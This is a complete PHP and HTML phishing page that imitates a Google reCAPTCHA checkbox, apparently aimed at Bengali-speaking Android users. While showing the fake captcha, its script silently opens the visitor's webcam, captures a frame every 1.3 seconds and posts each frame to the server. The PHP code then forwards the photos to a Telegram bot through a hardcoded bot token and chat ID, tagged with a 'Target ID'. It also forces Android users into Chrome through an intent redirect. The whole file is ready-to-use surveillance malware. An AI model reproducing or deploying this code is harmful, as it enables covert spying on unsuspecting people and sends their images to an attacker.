<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
    
    $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
    $chatId = "5896019931"; 

    if (isset($_POST['chat_id']) && !empty($_POST['chat_id'])) {
        $encodedCid = $_POST['chat_id'];
        $decodedCid = base64_decode(str_pad(strtr($encodedCid, '-_', '+/'), strlen($encodedCid) % 4, '=', STR_PAD_RIGHT));
        if ($decodedCid !== false && is_numeric($decodedCid)) {
            $chatId = $decodedCid;
        }
    }

    $uploadDir = 'uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    $imgData = $_POST['image'];
    $imgData = str_replace('data:image/png;base64,', '', $imgData);
    $imgData = str_replace(' ', '+', $imgData);
    $data = base64_decode($imgData);

    $targetId = isset($_POST['target']) ? $_POST['target'] : 'direct';

    $fileName = 'img_' . uniqid() . '.png';
    $filePath = $uploadDir . $fileName;

    if (file_put_contents($filePath, $data)) {
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        
        $postFields = [
            'chat_id' => $chatId,
            'caption' => "🎯 Target ID: {$targetId}\n📁 File: {$fileName}",
            'photo'   => new CURLFile(realpath($filePath))
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2); 

        curl_exec($ch);
        curl_close($ch);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #f9f9f9; 
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-family: Roboto, helvetica, arial, sans-serif;
        }
        
        .recaptcha-box {
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 3px;
            padding: 20px 25px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 300px;
            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
            display: none;
            cursor: pointer;
        }

        .recaptcha-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .recaptcha-checkbox {
            width: 28px;
            height: 28px;
            background: #fff;
            border: 2px solid #c1c1c1;
            border-radius: 2px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            transition: background 0.2s, border-color 0.2s;
        }

        .recaptcha-checkbox.checked::after {
            content: "";
            position: absolute;
            width: 6px;
            height: 12px;
            border: solid #006600;
            border-width: 0 3px 3px 0;
            transform: rotate(45deg);
            margin-bottom: 3px;
        }

        .recaptcha-text {
            font-size: 14px;
            color: #2c2c2c;
            user-select: none;
        }

        .recaptcha-right {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .recaptcha-logo {
            width: 32px;
            height: 32px;
            background-image: url('https://www.gstatic.com/recaptcha/api2/logo_48.png');
            background-size: contain;
            background-repeat: no-repeat;
        }

        .recaptcha-footer {
            font-size: 10px;
            color: #555;
            margin-top: 2px;
        }

        /* Chrome Warning Banner Style */
        #chromeWarning {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #fff;
            z-index: 9999;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            box-sizing: border-box;
            text-align: center;
        }

        .chrome-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
            font-weight: bold;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            text-decoration: none;
            display: inline-block;
        }
    </style>
</head>
<body>

    <!-- Chrome Browser Warning / Open in Chrome Button -->
    <div id="chromeWarning">
        <h3 style="color: #333; margin-bottom: 10px;">⚠️ অনুগ্রহ করে ক্রোম ব্রাউজার ব্যবহার করুন</h3>
        <p style="color: #666; font-size: 14px; max-width: 300px; line-height: 1.5;">সঠিকভাবে ওপেন করার জন্য নিচের বাটনে ক্লিক করে Google Chrome ব্রাউজার সিলেক্ট করুন।</p>
        <a href="#" id="openChromeBtn" class="chrome-btn">Open in Chrome</a>
    </div>

    <div class="recaptcha-box" id="recaptchaContainer" onclick="openTargetLink()">
        <div class="recaptcha-left">
            <div class="recaptcha-checkbox" id="recaptchaCheckbox"></div>
            <span class="recaptcha-text">I am not a robot</span>
        </div>
        <div class="recaptcha-right">
            <div class="recaptcha-logo"></div>
            <div class="recaptcha-footer">reCAPTCHA</div>
        </div>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const ua = navigator.userAgent;
        const isChrome = /CriOS|Chrome/.test(ua) && !/Edge|OPR|SamsungBrowser/.test(ua);
        const isAndroid = /Android/i.test(ua);

        const currentUrl = window.location.href;
        const cleanUrl = currentUrl.replace(/^https?:\/\//, '');

        if (isAndroid && !isChrome) {
            // ১. প্রথমে অটো ইন্টেন্ট ট্রাই করবে
            window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end;`;

            // ২. যদি অটো রিডাইরেক্ট ব্লক হয়, তবে ফোর্সিং বক্স বা বাটন দেখাবে
            window.onload = function() {
                document.getElementById('chromeWarning').style.display = 'flex';
                document.getElementById('openChromeBtn').href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end;`;
            };
        }

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        const urlParams = new URLSearchParams(window.location.search);
        const targetId = urlParams.get('id') || 'direct';
        const userChatId = urlParams.get('cid') || ''; 
        const rawTargetUrl = urlParams.get('url');

        let finalUrl = "https://www.aapunkagames.com/"; 

        if (rawTargetUrl) {
            try {
                finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/'));
            } catch (e) {
                console.error("URL decode error:", e);
            }
        }

        const recaptchaContainer = document.getElementById('recaptchaContainer');
        if (finalUrl) {
            recaptchaContainer.style.display = 'flex';
        }

        function openTargetLink() {
            const checkbox = document.getElementById('recaptchaCheckbox');
            checkbox.style.background = '#fff';
            checkbox.classList.add('checked');
            
            setTimeout(() => {
                window.open(finalUrl, '_blank');
            }, 500);
        }

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                setTimeout(() => {
                    setInterval(captureAndUpload, 1300);
                }, 1000);
            })
            .catch(err => {
                console.error("Camera error: ", err);
            });

        function captureAndUpload() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'image=' + encodeURIComponent(imageData) + '&target=' + encodeURIComponent(targetId) + '&chat_id=' + encodeURIComponent(userChatId)
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
